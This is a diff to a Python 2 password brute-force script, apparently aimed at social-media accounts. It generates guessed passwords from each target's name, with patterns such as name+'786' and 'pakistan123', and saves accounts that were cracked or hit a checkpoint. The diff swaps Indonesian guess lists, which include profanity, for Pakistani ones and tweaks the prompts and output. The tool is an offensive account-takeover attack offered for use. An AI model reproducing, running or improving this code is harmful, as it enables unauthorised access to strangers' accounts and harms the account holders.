@@ -1,6 +1,8 @@
 #!usr/bin/python2.7
 # coding=utf-8
 
+###SCRIPT FROM INDONESIA###
+
 import requests, json, sys, os, re
 from multiprocessing.pool import ThreadPool as th
 from datetime import datetime
@@ -86,37 +88,14 @@ class Brute:
 				obj = user['name'].split(' ')
 				if len(obj) == 1:
 					listpass = [
-						obj[0]+'123', obj[0]+'1234', obj[0]+ 'khan', 'pakistan', 'pakistan1', '786786',
-						obj[0]+'12345', obj[0]+'786', 'pakistan786', 'pakistan123',
-					]
-				elif len(obj) == 2:
-					listpass = [
-						obj[0]+'123', obj[0]+'12345', obj[0]+'1234', obj[0]+'khan', obj[0]+'786', 'pakistan786', 'pakistan123',
-						obj[1]+'123', obj[1]+'12345', obj[1]+'1234', obj[1]+'khan', obj[1]+'786', 'pakistan', 'pakistan1', '786786',
-					]
-				elif len(obj) == 3:
-					listpass = [
-						obj[0]+'123', obj[0]+'12345', obj[1]+'1234', obj[1]+'khan', obj[1]+'786', 'pakistan786', 'pakistan123',
-						obj[1]+'123', obj[1]+'12345', obj[2]+'1234', obj[2]+'khan', obj[2]+'786', 'pakistan', 'pakistan1', '786786',
-						obj[2]+'123', obj[2]+'12345', obj[3]+'1234', obj[3]+'khan', obj[3]+'786',
-					]
-				elif len(obj) == 4:
-					listpass = [
-						obj[0]+'123', obj[0]+'12345', obj[1]+'1234', 'sayangkamu', ',bangsat', 'anjing', 'kontol', 'alucard',
-						obj[1]+'123', obj[1]+'12345', obj[2]+'1234', 'sayang', 'indonesia', 'doraemon', 'moonton',
-						obj[2]+'123', obj[2]+'12345', obj[3]+'1234', 'anjingkau', 'iloveyou', 'ganteng', 'bangke',
-						obj[3]+'123', obj[3]+'12345', obj[4]+'1234',
-					]
-				else:
-					listpass = [
-						'sayang', 'doraemon', 'kontol123', 'indonesia', 'iloveyou', 'mantananjing', 'bangke', 'moonton',
-						'bangsat', 'kontol', 'memek123', 'sayangkamu', 'anjing', 'ganteng', 'sembiring', 'alucard',
+						obj[1]+'123', obj[1]+'1234', obj[1]+'khan', 'pakistan', 'pakistan1', '786786',
+						obj[1]+'12345', obj[1]+'786', obj[1]+'87', 'pakistan786', 'pakistan123',
 					]
 				self.target.append({'id': user['uid'], 'pw': listpass})
 			except: pass
 		if len(self.target) == 0:
 			exit("\n\033[0;91m Oops, id not found in file '%s'\033[0m"% file)
-		ask = raw_input('\033[1;93mUse password defaults OR manual? [D/m]:\033[1;90m ')
+		ask = raw_input('\033[1;93mUse password defaults OR manual? [D/m](recommended [D]):\033[1;90m ')
 		if ask.lower() == 'm':
 			while True:
 				print('\n\033[1;92mSet password use (,) for new password, EX: Zero,ZxXx-Angel,ZalasXa\n\033[0m')
@@ -131,11 +110,11 @@ class Brute:
 	def results(self):
 		if (len(self.ok) != 0):
 			print('\n\nOK: '+str(len(self.ok)))
-			for i in self.ok: print('\033[0;92m### ' +str(i)+'\033[0m')
+			for i in self.ok: print('\033[0;92m>>> ' +str(i)+'\033[0m')
 			print('Your OK results saved in: out/ok.txt')
 		if (len(self.cp) != 0):
 			print('\n\nCP: '+str(len(self.cp)))
-			for i in self.cp: print('\033[0;93m### '+str(i)+'\033[0m')
+			for i in self.cp: print('\033[0;93m>>> '+str(i)+'\033[0m')
 			print('Your CP results saved in: out/cp.txt')
 		if (len(self.cp) == 0 and len(self.ok) == 0):
 			print('\n\n\033[0;91mNo results found :(\033[0m')
